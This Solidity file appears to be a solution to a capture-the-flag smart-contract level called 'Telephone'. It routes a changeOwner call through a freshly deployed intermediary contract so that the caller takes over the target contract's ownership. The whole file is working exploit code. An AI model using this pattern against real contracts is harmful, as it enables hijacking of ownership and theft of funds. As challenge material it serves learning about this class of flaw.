// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Pwn {
    function pwn(ITelephone telephone, address owner) public {
        telephone.changeOwner(owner);
    }
}

contract TelephoneHack {
    ITelephone public challenge;

    constructor(address challengeAddress) {
        challenge = ITelephone(challengeAddress);
    }

    function attack() external payable {
        (new Pwn()).pwn(challenge, msg.sender);
    }
}
